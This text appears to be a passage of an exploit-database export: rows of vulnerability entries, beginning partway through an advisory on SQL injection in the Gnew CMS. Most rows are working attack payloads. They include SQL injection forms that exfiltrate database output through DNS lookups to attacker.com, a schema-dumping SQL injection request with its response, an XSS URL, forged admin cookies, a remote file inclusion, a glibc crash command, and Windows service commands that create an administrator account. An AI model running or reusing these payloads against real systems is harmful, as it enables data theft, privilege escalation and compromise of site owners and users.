passed to ""/polls/vote.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/polls/vote.php"" method=""post"" name=""main""> <input type=""hidden"" name=""add_vote"" value=""1""> <input type=""hidden"" name=""answer_id"" value=""1""> <input type=""hidden"" name=""question_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""submit"" id=""btn""> </form>  2.5 The vulnerability exists due to insufficient filtration of ""story_id"" HTTP POST parameter passed to ""/comments/add.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/comments/add.php"" method=""post"" name=""main""> <input type=""hidden"" name=""add"" value=""1""> <input type=""hidden"" name=""preview"" value=""1""> <input type=""hidden"" name=""comment_subject"" value=""1""> <input type=""hidden"" name=""comment_text"" value=""1""> <input type=""hidden"" name=""story_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""submit"" id=""btn""> </form>  2.6 The vulnerability exists due to insufficient filtration of ""story_id"" HTTP POST parameter passed to ""/comments/edit.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/comments/edit.php"" method=""post"" name=""main""> <input type=""hidden"" name=""edit"" value=""1""> <input type=""hidden"" name=""preview_edited"" value=""1""> <input type=""hidden"" name=""comment_subject"" value=""1""> <input type=""hidden"" name=""comment_text"" value=""1""> <input type=""hidden"" name=""story_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""submit"" id=""btn""> </form>  2.7 The vulnerability exists due to insufficient filtration of ""thread_id"" HTTP POST parameter passed to ""/posts/add.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/posts/add.php"" method=""post"" name=""main""> <input type=""hidden"" name=""add"" value=""1""> <input type=""hidden"" name=""preview"" value=""1""> <input type=""hidden"" name=""thread_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""submit"" id=""btn""> </form>  2.8 The vulnerability exists due to insufficient filtration of ""thread_id"" HTTP POST parameter passed to ""/posts/edit.php"" script. A remote authenticated attacker can execute arbitrary SQL commands in application's database.  The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of "".attacker.com"" (a domain name, DNS server of which is controlled by the attacker):  <form action=""http://[host]/posts/edit.php"" method=""post"" name=""main""> <input type=""hidden"" name=""edit"" value=""1""> <input type=""hidden"" name=""preview_edited"" value=""1""> <input type=""hidden"" name=""thread_id"" value=""' AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR( 107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92), CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- ""> <input type=""submit"" id=""btn""> </form>  Successful exploitation of vulnerabilities 2.3-2.8 requires that attacker is registered and logged-in. Registration is opened by default.  Vulnerabilities 2.1, 2.2 and 2.8 were discovered by Gjoko Krstic: http://packetstormsecurity.com/files/122771 on July 23, 2013. High-Tech Bridge Research Lab has discovered these vulnerabilities independently and publishes them as since the Vendor notification date they remain unpatched.  ------------------------------------------------------------------------ -----------------------  Solution:  Vendor did not reply to 6 notifications by email. Currently we are not aware of any official solution for these vulnerabilities.  Unofficial patch was developed by High-Tech Bridge Security Research Lab and is available here: https://www.htbridge.com/advisory/HTB23171-patch.zip  ------------------------------------------------------------------------ -----------------------  References:  [1] High-Tech Bridge Advisory HTB23171 - https://www.htbridge.com/advisory/HTB23171 - Multiple vulnerabilities in Gnew. [2] Gnew - http://www.gnew.fr - Gnew is a simple and open-source Content Management System. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types. [5] ImmuniWebÂ® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.  ------------------------------------------------------------------------ -----------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",remote,webapps,1
33230,"GNU glibc 2.x - 'strfmon()' Integer Overflow source: https://www.securityfocus.com/bid/36443/info  GNU glibc is prone to an integer-overflow weakness.  An attacker can exploit this issue through other applications such as PHP to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.  GNU glibc 2.10.1 and prior are vulnerable.   The following proof-of-concept commands are available:  php -r 'money_format(""%.1073741821i"",1);' php -r 'money_format(""%.1343741821i"",1);'",remote,dos,1
30818,"ht://Dig 3.2 - Htsearch Cross-Site Scripting source: https://www.securityfocus.com/bid/26610/info  ht://Dig is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue allows an attacker to execute arbitrary HTML or script code in a user's browser session in the context of an affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  This issue affects ht://Dig 3.2.0b6; other versions may also be vulnerable.   http://www.example.com/cgi-bin/htsearch?config=&restrict=&exclude=&method=and&format=builtin-long&sort=<script>alert(""foo"")</script>&words=foo",remote,webapps,1
9807,"Adobe Photoshop Elements 8.0 - Active File Monitor Privilege Escalation Adobe Photoshop Elements 8.0 Active File Monitor Service Bad Security Descriptor Local Elevation Of Privileges by Nine:Situations:Group::bellick site: http://retrogod.altervista.org/  Tested on Microsoft Windows XP SP3  The ""Adobe Active File Monitor V8"" service is installed with an improper security descriptor. A malicious user of the Users group (which on xp means a ""limited account"") can stop the service, then invoke the ""sc config"" command to replace the binary path with a value of choice, then restart the service to run the command with SYSTEM privileges ex., run theese commands as a limited user:  sc stop ""AdobeActiveFileMonitor8.0"" sc config ""AdobeActiveFileMonitor8.0"" binPath= ""cmd /c net user adobe kills /add && net localgroup Administrators adobe /add"" sc start ""AdobeActiveFileMonitor8.0"" runas /noprofile /user:%COMPUTERNAME%\adobe cmd  now login as administrator with password ""kills""  mitigation:  the security descriptor of the service is like this:  C:\>sc sdshow ""AdobeActiveFileMonitor8.0""  D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)  note the WO and WD permission for Everyone (!!!!!)  change the security descriptor like the following:  c:\sc sdset ""AdobeActiveFileMonitor8.0"" D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY) [SC] SetServiceObjectSecurity SUCCESS  readings, interesting article: http://msmvps.com/blogs/erikr/archive/2007/09/26/set-permissions-on-a-specific-service-windows.aspx",local,local,1
15268,"WikiWebHelp 0.3.3 - Insecure Cookie Handling =============================================== WikiWebHelp v0.3.3 <= Insecure Cookie Handling =============================================== ~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [+] Author : FuRty [~] Contact : fir4t@fir4t.org ~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~Web App. : WikiWebHelp ~Version : 0.3.3 ~Software: http://sourceforge.net/projects/wwh/ ~Vendor : http://wikiwebhelp.org ~Vulnerability Style : Cookie Handling ~Google Keyword : Powered by WikiWebHelp [~]Date : ""17.10.2010"" ----------- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~          ~~~~~~~~ Explotation ~~~~~~~~~~~       Browser Injection for handling() by Javascript-SQLi Codes     ================================     Do not rush to primarily target the site, please register:)      javascript:document.cookie=""loggedon=[VictimNICK];path=/""; javascript:document.cookie=""level=admin;path=/"";     ================================           [+]  Cookie Browser Injected!             [+]  Logged on                                        Ýyi þanslar :C / GoodLuck",remote,webapps,1
45692,"MPS Box 0.1.8.0 - 'uuid' SQL Injection # Exploit Title: MPS Box 0.1.8.0 - 'uuid' SQL Injection # Dork: N/A # Date: 2018-10-25 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://www.mpsbox.com/ # Software Link: https://sourceforge.net/projects/mpsbox/files/latest/download # Version: 0.1.8.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/inc/popup.qrcode.inc.php?uuid=[SQL]  # [PATH]/inc/popup.qrcode.inc.php #  # 24 include_once(""dbfunctions.inc.php""); # 25  # 26 $uuid = $_GET[""uuid""]; # 27  # 28 $db = pdo_connect(); # 29  # 30 $dev_data_sql = $db->query(""SELECT ref_name,ip_add,model_name,serial_num FROM USR_DEVICES where uuid IN ($uuid)""); # 31 $row_count = $dev_data_sql->rowCount(); # 32  # 33 ?>   GET /[PATH]/inc/popup.qrcode.inc.php?uuid=1)+UniON+sELect+0x496873616e2053656e63616e%2c(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c0x496873616e2053656e63616e%2c0x496873616e2053656e63616e--+- HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive HTTP/1.1 200 OK Date: Thu, 25 Oct 2018 13:19:47 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Set-Cookie: PHPSESSID=8m9cbclampf4u5n4ketdi2q997; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8",remote,webapps,1
29912,DynaTracker 1.5.1 - 'action.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/23667/info   DynaTracker is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.   Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.   DynaTracker 1.5.1 is reported vulnerable; other versions may also be affected.   http://www.example.com/DynaTracker_v151/action.php?base_path=http://shell,remote,webapps,1
